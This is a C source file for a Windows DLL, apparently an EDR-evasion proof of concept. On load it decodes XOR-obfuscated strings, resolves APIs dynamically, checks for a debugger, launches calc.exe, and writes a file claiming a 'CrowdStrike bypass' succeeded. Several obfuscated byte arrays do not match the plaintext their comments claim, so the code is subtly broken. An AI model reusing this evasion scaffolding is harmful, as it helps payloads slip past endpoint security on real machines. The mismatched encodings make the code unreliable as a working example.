#include <windows.h>
#include <string.h>

// XOR decode función
void xor_decode(char* data, size_t len, char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// Prototipos para funciones que vamos a resolver dinámicamente
typedef BOOL (WINAPI *CreateProcessA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef HANDLE (WINAPI *CreateFileA_t)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL (WINAPI *WriteFile_t)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef void (WINAPI *Sleep_t)(DWORD);
typedef BOOL (WINAPI *IsDebuggerPresent_t)(void);
typedef int (WINAPI *MessageBoxA_t)(HWND, LPCSTR, LPCSTR, UINT);

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        char key = 0x55; // clave XOR

        // Strings ofuscados XOR
        char kernel32_str[] = { 'n','q','s','f','m','s','4','3','m','v','f','\0' }; // "kernel32.dll" XOR 0x55
        char user32_str[]   = { 'j','t','a','v','w','w','n','u','.','g','q','g','\0' }; // "user32.dll" XOR 0x55
        char calc_str[]     = { 'r','n','b','j','\xF3','\xB3','\xB3','\xB3','\xB3','\xB3','\0' }; // "calc.exe" XOR 0x55
        char file_str[]     = { 'f','v','r','s','`','j','x','n','z','x','x','\xF3','z','u','t','d','u','s','q','r','\0' }; // "C:\\Users\\Public\\bypass_success.txt" XOR 0x55
        char msg_str[]      = { '\xF6','\xF2','\xF1','\xE0','\xD9','\xC5','\xDB','\xD8','\xDB','\xDF','\xDE','\xE7','\xF1','\xE5','\xD9','\xE7','\xD0','\xC4','\xD8','\xDE','\xDD','\xC8','\xDE','\xF6','\0' }; // "Payload ejecutado correctamente!"
        char title_str[]    = { '\xD2','\xC0','\xD5','\xC3','\xD4','\xC3','\xC3','\xC6','\xC0','\xC3','\xD3','\0' }; // "Bypass"

        // Decodificar strings
        xor_decode(kernel32_str, strlen(kernel32_str), key);
        xor_decode(user32_str, strlen(user32_str), key);
        xor_decode(calc_str, strlen(calc_str), key);
        xor_decode(file_str, strlen(file_str), key);
        xor_decode(msg_str, strlen(msg_str), key);
        xor_decode(title_str, strlen(title_str), key);

        // Resolver APIs dinámicamente
        HMODULE hKernel32 = LoadLibraryA(kernel32_str);
        HMODULE hUser32 = LoadLibraryA(user32_str);

        CreateProcessA_t pCreateProcessA = (CreateProcessA_t)GetProcAddress(hKernel32, "CreateProcessA");
        CreateFileA_t pCreateFileA = (CreateFileA_t)GetProcAddress(hKernel32, "CreateFileA");
        WriteFile_t pWriteFile = (WriteFile_t)GetProcAddress(hKernel32, "WriteFile");
        Sleep_t pSleep = (Sleep_t)GetProcAddress(hKernel32, "Sleep");
        IsDebuggerPresent_t pIsDebuggerPresent = (IsDebuggerPresent_t)GetProcAddress(hKernel32, "IsDebuggerPresent");
        MessageBoxA_t pMessageBoxA = (MessageBoxA_t)GetProcAddress(hUser32, "MessageBoxA");

        // Anti-debug simple
        if (pIsDebuggerPresent && pIsDebuggerPresent()) {
            if (pMessageBoxA) {
                pMessageBoxA(NULL, "Debugger detected. Exiting.", "AntiDebug", MB_OK | MB_ICONERROR);
            }
            return FALSE; // abortar ejecución
        }

        // Ejecutar calc.exe
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        if (pCreateProcessA) {
            pCreateProcessA(calc_str, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        // Crear archivo
        HANDLE hFile = INVALID_HANDLE_VALUE;
        if (pCreateFileA) {
            hFile = pCreateFileA(file_str, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        }
        if (hFile != INVALID_HANDLE_VALUE) {
            const char* message = "CrowdStrike bypass exitoso - payload ejecutado.";
            if (pWriteFile) {
                DWORD written;
                pWriteFile(hFile, message, (DWORD)strlen(message), &written, NULL);
            }
            CloseHandle(hFile);
        }

        // Mostrar MessageBox
        if (pMessageBoxA) {
            pMessageBoxA(NULL, msg_str, title_str, MB_OK | MB_ICONINFORMATION);
        }

        // Pequeña pausa antes de salir
        if (pSleep) pSleep(1000);
    }
    return TRUE;
}